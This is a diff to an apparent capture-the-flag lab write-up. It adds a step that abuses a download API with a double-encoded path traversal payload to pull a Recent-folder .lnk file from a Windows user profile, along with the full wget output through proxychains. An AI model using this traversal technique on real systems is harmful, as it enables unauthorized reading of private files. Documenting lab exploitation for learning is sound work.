@@ -720,6 +720,28 @@ MRUListEx = 0
 
 
 ```
+
+Windows saves a link to recent documents location in `AppData\Roaming\Microsoft\Windows\Recent` under the same filename plus .lnk
+
+```
+proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cAppData%255cRoaming%255cMicrosoft%255cWindows%255cRecent%255cdb.zip.lnk' -O db.zip.lnk 
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+--2026-10-31 11:22:34--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cAppData%255cRoaming%255cMicrosoft%255cWindows%255cRecent%255cdb.zip.lnk
+Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
+Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
+connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 792 [application/octet-stream]
+Saving to: ‘db.zip.lnk’
+
+db.zip.lnk                  100%[===========================================>]     792  --.-KB/s    in 0s      
+
+2026-10-31 11:22:34 (198 MB/s) - ‘db.zip.lnk’ saved [792/792]
+
+```
+
 ---
 ## Foothold
 
